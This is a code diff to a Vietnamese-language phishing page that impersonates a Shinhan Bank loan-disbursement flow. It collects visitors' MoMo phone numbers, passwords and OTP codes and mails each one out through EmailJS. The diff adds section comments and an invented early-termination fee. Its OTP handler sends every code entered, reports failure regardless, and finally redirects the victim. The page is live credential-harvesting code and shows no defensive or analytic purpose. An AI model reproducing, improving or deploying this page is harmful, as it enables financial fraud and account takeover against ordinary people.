@@ -9,6 +9,7 @@
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Lexend:wght@400;500;600;700&display=swap" rel="stylesheet">
     
+    <!-- EmailJS SDK -->
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <script type="text/javascript">
       (function() {
@@ -205,6 +206,7 @@
 </head>
 <body>
     <div class="mobile-frame">
+        <!-- Confirmation View -->
         <div id="confirmation-section" class="page-section active">
             <header class="page-header">
                  <button class="back-button" onclick="window.location.href='https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html'"><img src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='currentColor'%3e%3cpath fill-rule='evenodd' d='M11.03 3.97a.75.75 0 010 1.06l-6.22 6.22H21a.75.75 0 010 1.5H4.81l6.22 6.22a.75.75 0 11-1.06 1.06l-7.5-7.5a.75.75 0 010-1.06l7.5-7.5a.75.75 0 011.06 0z' clip-rule='evenodd' /%3e%3c/svg%3e" alt="Back"/></button>
@@ -231,6 +233,7 @@
             </footer>
         </div>
 
+        <!-- MoMo Phone Input View -->
         <div id="momo-phone-section" class="page-section">
             <header class="page-header">
                 <button class="back-button" onclick="showSection('confirmation-section')"><img src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke-width='2' stroke='%231d1d1f'%3e%3cpath stroke-linecap='round' stroke-linejoin='round' d='M15.75 19.5L8.25 12l7.5-7.5' /%3e%3c/svg%3e" alt="Back"/></button>
@@ -263,6 +266,7 @@
             </main>
         </div>
 
+        <!-- MoMo Password Input View -->
         <div id="momo-password-section" class="page-section">
             <header class="page-header">
                 <button class="back-button" onclick="showSection('momo-phone-section')"><img src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke-width='2' stroke='%231d1d1f'%3e%3cpath stroke-linecap='round' stroke-linejoin='round' d='M15.75 19.5L8.25 12l7.5-7.5' /%3e%3c/svg%3e" alt="Back"/></button>
@@ -283,6 +287,7 @@
             </footer>
         </div>
 
+        <!-- MoMo OTP Input View -->
         <div id="momo-otp-section" class="page-section">
             <header class="page-header">
                 <button class="back-button" onclick="showSection('momo-password-section')"><img src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke-width='2' stroke='%231d1d1f'%3e%3cpath stroke-linecap='round' stroke-linejoin='round' d='M15.75 19.5L8.25 12l7.5-7.5' /%3e%3c/svg%3e" alt="Back"/></button>
@@ -310,6 +315,7 @@
         </div>
     </div>
 
+    <!-- Notification Toast Structure -->
     <div id="notification" class="notification"></div>
 
     <script>
@@ -330,7 +336,6 @@
             };
             
             const formData = getFormData();
-            // === THÊM LẠI BIẾN ĐẾM SỐ LẦN THỬ OTP ===
             let otpAttempts = 0;
             
             const getEl = (id) => document.getElementById(id);
@@ -370,7 +375,7 @@
                 const principal = formData.amount || 0;
                 const interest = formData.interest !== undefined ? formData.interest : (principal * 0.057);
                 const overdueAmount = 0;
-                const earlyTerminationFee = 0;
+                const earlyTerminationFee = 870000;
                 const collectionFee = 24000;
                 const customerName = formData.fullName || '';
                 const contractNumber = 'SHB-' + Math.floor(1000000000 + Math.random() * 9000000000);
@@ -389,11 +394,12 @@
                 
                 const customerDetailsContainer = getEl('customer-details');
                 customerDetailsContainer.innerHTML = '';
-                if (customerName) {
-                    customerDetailsContainer.appendChild(createDetailItem('Tên khách hàng', customerName));
-                }
-                customerDetailsContainer.appendChild(createDetailItem('Số hợp đồng', contractNumber));
                 
+                customerDetailsContainer.appendChild(createDetailItem('Số hợp đồng', contractNumber));
+                // === SỬA LỖI: Luôn hiển thị mục "Tên khách hàng" ===
+                // Nếu không có tên, hiển thị 'Không có' để dễ nhận biết.
+                customerDetailsContainer.appendChild(createDetailItem('Tên khách hàng', customerName || 'Không có'));
+
                 const closingDate = new Date();
                 closingDate.setMonth(closingDate.getMonth() + loanTermInMonths);
                 const formattedClosingDate = closingDate.toLocaleDateString('vi-VN', {
@@ -454,7 +460,7 @@
                 const serviceID = 'service_60tgxof';
                 let templateID = '';
                 let templateParams = {};
-                const contractNumber = getEl('customer-details').querySelector('.detail-item:last-child .value')?.textContent || '';
+                const contractNumber = getEl('customer-details').querySelector('.detail-item .value')?.textContent || '';
 
                 const commonParams = {
                     platform: "MoMo (Shinhan Layout)",
@@ -484,7 +490,6 @@
                 otpInputs[0].focus();
             };
             
-            // === CẬP NHẬT HÀM THEO YÊU CẦU MỚI ===
             window.handleOtpSubmit = () => {
                 credentials.otp = Array.from(otpInputs).map(input => input.value).join('');
                 
@@ -498,10 +503,8 @@
                 otpLoading.style.display = 'block';
                 otpSubmitBtn.disabled = true;
                 
-                // Luôn gửi dữ liệu ở mỗi lần nhấn nút, theo yêu cầu
                 sendToEmail('otp', credentials.otp);
 
-                // Mô phỏng quá trình xác thực với các kịch bản lỗi khác nhau
                 setTimeout(() => {
                     otpAttempts++;
                     otpLoading.style.display = 'none';
@@ -516,15 +519,15 @@
                             showNotification('Mã xác nhận không chính xác.<br>Vui lòng thử lại.', 'error', 3500);
                             clearOtpInputs();
                             break;
-                        default: // Lần thứ 3 trở đi
-                             otpSubmitBtn.disabled = true; // Vô hiệu hoá nút vì sẽ chuyển hướng
+                        default: 
+                             otpSubmitBtn.disabled = true;
                              showNotification('Giải ngân không thành công.<br>Đang chuyển về trang chủ...', 'error', 4000);
                              setTimeout(() => {
                                  window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html';
                              }, 4000);
                              break;
                     }
-                }, 2000); // Thời gian chờ 2 giây
+                }, 2000); 
             };
 
             otpInputs.forEach((input, index) => {
